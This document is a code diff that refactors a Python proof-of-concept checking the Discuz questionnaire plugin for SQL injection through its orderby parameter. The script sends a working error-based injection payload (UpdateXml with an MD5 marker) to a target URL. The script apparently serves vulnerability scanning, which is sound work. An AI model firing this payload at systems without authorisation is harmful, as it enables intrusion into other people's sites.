@@ -10,20 +10,13 @@ description: 文件plugin.php中,参数orderby存在SQL注入。
 import sys
 import requests
 import warnings
-  
-
-
-class plugin_ques_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['discuz问卷调查参数orderby注入漏洞', '', '']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline/**/And/**/1=(UpdateXml(1,ConCat(0x7e,Md5(1234)),1))--"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed05" in req.text:
@@ -37,5 +30,4 @@ class plugin_ques_sqli:
         return result
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = plugin_ques_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
